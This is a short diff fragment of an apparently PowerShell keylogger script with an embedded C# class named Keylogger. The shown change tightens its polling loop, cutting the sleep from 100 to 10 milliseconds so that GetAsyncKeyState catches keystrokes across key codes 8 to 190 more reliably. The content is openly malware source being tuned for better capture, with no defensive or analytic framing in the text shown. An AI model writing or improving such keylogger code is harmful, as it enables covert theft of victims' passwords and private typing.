@@ -12,7 +12,7 @@ public class Keylogger {
 "@
 
 while ($true) {
-    Start-Sleep -Milliseconds 100
+    Start-Sleep -Milliseconds 10
     for ($i = 8; $i -le 190; $i++) {
         $state = [Keylogger]::GetAsyncKeyState($i)
         if ($state -eq -32767) {
